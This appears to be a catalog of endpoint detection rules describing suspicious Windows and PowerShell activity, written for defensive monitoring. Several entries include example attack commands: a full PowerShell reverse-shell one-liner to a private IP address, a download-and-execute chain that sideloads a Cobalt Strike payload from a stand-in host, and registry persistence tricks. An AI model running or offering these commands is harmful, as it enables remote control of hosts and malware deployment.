metadata.title: RESEARCH: PowerShell StreamReader Command script_block
metadata.description:
A script_block event associated with PowerShell being used to execute a remote script was identified. This activity may indicate that threat actors are executing code within the environment.

metadata.title: RESEARCH: System Protection Background Task Executes Restore Process
metadata.description:
A process event associated with the Windows System Protection Background Task executing a restore process was identified. This activity may indicate that an adversary is attempting to revert the system's state to a previous point in time to ensure evidence of malicious activity cannot be recovered.

Example:
> srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2

Srtasks.exe is the process which creates system restore points in Windows.  This has been observed in Qakbot activity.

metadata.title: RESEARCH: Service FailureCommand Value Added (regmod)
metadata.description:
A registry event indicating the creation of or modification of a Windows service's "FailureCommand" value in the Windows registry was identified.

Windows services' registry keys may have an optional value named "FailureCommand", which allows a command to be run when the service fails to start. If the service key has weak permissions that allow low privileged users to create values, a low privileged user may be able to escalate their privileges to SYSTEM by creating
the "FailureCommand" value. The "FailureCommand" subkey may also be used as a stealthy malware persistence technique.

metadata.title: RESEARCH: Data Transfer
metadata.description:
A script block event that contains a stream of data being received was identified. This may indicate that threat actors are leveraging a PowerShell Command and Control (C2) channel.

Example:
>  $client = New-Object System.Net.Sockets.TCPClient("172.18.17.252",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

metadata.title: RESEARCH: Multiple Files Downloaded using Invoke-WebRequest Commands (script_block)
metadata.description:
A script_block event associated with a PowerShell command that calls the 'Invoke-WebRequest' (or an alias for it: iwr, curl, wget) command multiple times was identified. This may indicate that a threat actor is downloading malware to the host.

> powershell -c Invoke-WebRequest -uri hxxp://example.com:443/mpclient.dll -OutFile c:\windows\help\windows\mpclient.dll;Invoke-WebRequest -uri hxxp:/example.com:443/c0000015.log -OutFile c:\windows\help\windows\c0000015.log;Invoke-WebRequest -uri hxxp://example.com:443/MpCmdRun.exe -OutFile c:\windows\help\windows\MpCmdRun.exe;c:\windows\help\windows\MpCmdRun.exe

In this example the Microsoft Defender executable is downloaded with a malicious 'mpclient.dll', which loads a Cobalt Strike payload from c0000015.log. In August 2022 SentinelONE described this sideloading approach being used to deploy Cobalt Strike in LockBit ransomware intrusions.

metadata.title: WmiPersistence
metadata.description:
A suspicious persistence mechanism was identified on
  the system. The Windows Management Interface can be used to start programs
  in response to a variety of events. This is an uncommon and easily overlooked
  mechanism that has been abused to allow malware to persist. This configuration
  may be legitimate but probably merits review.

metadata.title: RESEARCH: Screensaver Configuration Registry Value Updated (registry)
metadata.description:
A registry event associated with updates to the configuration of a screensaver was identified. This may indicate that a threat actor is using a screensaver to persist a malicious executable.

Example:
> reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
>reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
> reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
> reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\hello.scr" /f

metadata.title: RESEARCH: Disabling Windows Shutdown Button (scriptblock)
metadata.description:
A script block event associated with disabling the Windows shutdown button was identified. This may indicate that malware has executed on the system and is attempting to prevent recovery efforts.

Example: 
> PS New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name shutdownwithoutlogon -Value 1

metadata.title: RESEARCH: PowerShell uses WMI to Query Win32_ComputerSystem
metadata.description:
A script_block event associated with a PowerShell script querying the Win32_ComputerSystem WMI class was identified. This may indicate that system hardware information is being queried via WMI to detect sandboxing or virtualization.

Example:
> Get-CimInstance -ClassName Win32_ComputerSystem
